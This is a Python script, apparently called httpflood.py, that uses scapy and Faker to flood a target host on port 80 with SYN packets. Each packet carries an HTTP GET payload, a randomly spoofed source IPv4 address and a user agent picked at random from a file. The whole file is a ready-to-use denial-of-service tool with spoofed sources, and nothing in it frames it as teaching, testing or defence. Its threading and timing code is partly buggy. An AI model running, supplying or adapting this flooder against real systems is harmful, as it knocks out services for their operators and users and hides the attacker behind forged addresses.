from scapy.all import *
from faker import Faker
import threading
from random import *
import sys
import time

def load_agents(name):
        agentlist = []
        with open(name, 'r') as file:
              for i in file.readlines():
                    agentlist.append(i)
        return agentlist

def error(message):
        sys.exit(message)

def better_send(pkt):
        try:
                send(pkt, verbose = 0)
        except:
                error('Invalid FQDN address')



def make(src, dst, alist):
        IPlayer = IP()
        TCPlayer = TCP()

        payload = f"GET / HTTP/1.1\r\nHost: {dst}\r\nAccept-Encoding: gzip, deflate\r\nUser-Agent: {choice(alist)}\r\n\r\n"

        IPlayer.src = src
        IPlayer.dst = dst

        TCPlayer.sport = RandShort()
        TCPlayer.dport = 80
        TCPlayer.flags = 'S'

        packet = IPlayer / TCPlayer / payload

        return packet

def flood(dst, packets, alist):
        fake = Faker()
        addrs = []
        packetlist = []

        proctime = time.process_time()

        print('making fake ip...')
        for i in range(0, packets+1):
                s = fake.ipv4()
                addrs.append(s)

        proctime = time.process_time()-proctime
        print(f'Done in {proctime} sec')        

        print('making packets...')
        for addr in addrs:
                s = make(addr, dst, alist)
                packetlist.append(s)

        proctime = time.process_time()-proctime
        print(f'Done in {proctime} sec')       

        print('sending packets...')
        for pkt in packetlist:
                s = threading.Thread(target= better_send(pkt))
                s.start()

        proctime = time.process_time()-proctime
        print(f'Done in {proctime} sec')        




# src = str(input('src: '))
agents = load_agents('agents.txt')
if len(sys.argv) != 3:
        print("USAGE:httpflood.py <FQDN> <number of packets>")
        sys.exit(1)

dst = sys.argv[1]
packets = sys.argv[2]
try:
        packets = int(packets)
except:
        error('Invalid number of packets')

flood(dst, packets, agents)